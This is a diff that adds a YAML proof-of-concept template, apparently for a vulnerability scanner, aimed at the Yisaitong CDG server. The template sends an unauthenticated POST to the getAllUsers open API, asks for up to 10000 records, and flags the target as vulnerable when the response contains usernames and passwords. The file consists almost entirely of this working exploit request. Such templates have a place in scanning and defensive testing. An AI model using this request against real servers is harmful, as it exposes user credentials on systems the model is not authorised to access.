@@ -1,0 +1,23 @@
+name: poc-yaml-yisaitong-getAllUsers-Information-disclosure
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /CDGServer3/openapi/getAllUsers
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        pageSize=10000&pageNumber=1
+    expression: response.status == 200 && response.body.bcontains(b'password') && response.body.bcontains(b'username')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486682&idx=1&sn=668809e5f2f46672da6cf65f924a2697&chksm=c267b9e9f51030ff79539087a735c4a95094cc4a94528a5e6521769d9e74903c9fc1a3d94d55&token=522460222&lang=zh_CN#rd
+
